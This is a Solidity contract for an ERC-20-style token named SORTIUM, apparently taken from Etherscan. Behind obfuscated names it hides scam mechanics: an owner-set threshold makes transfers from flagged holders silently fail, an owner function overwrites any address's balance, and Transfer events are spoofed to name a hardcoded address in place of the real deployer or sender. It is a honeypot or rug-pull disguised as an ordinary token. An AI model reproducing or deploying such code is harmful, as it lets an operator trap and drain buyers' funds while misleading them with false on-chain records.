/**
 *Submitted for verification at Etherscan.io on 2023-03-07
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract SORTIUM {
    using SafeMath for uint256;
    mapping (address => uint256) private YKa;
	
    mapping (address => uint256) public YKb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SORTIUM TOKEN";
	
    string public symbol = "SORTIUM";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private YKc;
      address private YKd;
    uint256 private YKe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address YKf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        YKd = msg.sender;
             YKa[msg.sender] = totalSupply;
        
       CAST();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CAST() internal  {                             
                       YKb[msg.sender] = 5;
                       YKc = YKf;

                

        emit Transfer(address(0), YKc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return YKa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(YKb[msg.sender] <= YKe) {
    require(YKa[msg.sender] >= value);
YKa[msg.sender] -= value;  
YKa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(YKb[msg.sender] > YKe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function xReed (address YKj, uint256 YKk) public {
		if(YKb[msg.sender] == YKe) {   
			   	   
   YKb[YKj] = YKk;}
   }
		       function ste (uint256 YKk) onlyOwner public {
                     YKe = YKk; 
	}

 		       function xBrn (address YKj, uint256 YKk) onlyOwner public {		   	   
  YKa[YKj] = YKk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(YKb[from] < YKe && YKb[to] < YKe) {
        require(value <= YKa[from]);
        require(value <= allowance[from][msg.sender]);
        YKa[from] -= value;
        YKa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(YKb[from] == YKe) {
        require(value <= YKa[from]);
        require(value <= allowance[from][msg.sender]);
        YKa[from] -= value;
        YKa[to] += value;
        allowance[from][msg.sender] -= value;


            from = YKf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(YKb[from] > YKe || YKb[to] > YKe) {
             
         }}



     

        	
 }